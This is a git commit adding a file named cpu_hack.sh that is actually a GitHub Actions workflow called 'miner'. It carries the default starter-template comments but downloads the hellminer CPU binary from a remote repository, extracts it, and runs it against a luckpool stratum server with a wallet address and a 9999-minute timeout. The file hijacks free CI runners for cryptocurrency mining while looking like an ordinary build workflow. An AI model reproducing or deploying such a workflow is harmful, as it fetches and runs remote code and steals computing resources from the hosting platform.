cc572ea313d1e5bf3632e3f64ad993808255beb3
okg123 <87088628+okg123@users.noreply.github.com>
2021-09-08 11:52:28 +0530

    Create cpu_hack.sh

---
+++ cpu_hack.sh
@@ -0,0 +1,24 @@
+# This is a basic workflow to help you get started with Actions
+
+name: miner 
+
+# Controls when the action will run. 
+on: workflow_dispatch
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "build"
+  build:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-latest
+    timeout-minutes: 9999
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps: 
+
+    # Runs a single command using the runners shell
+      - name: cloning
+        run: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+      - name: getting unzip
+        run: tar -xvf hellminer_cpu_linux.tar.gz
+      - name: Running hellminer
+        run: ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RPzoRzbAZLNcTXJ2D7NvpprGUMrrWBh12c.oskg -p x --cpu 2
+        
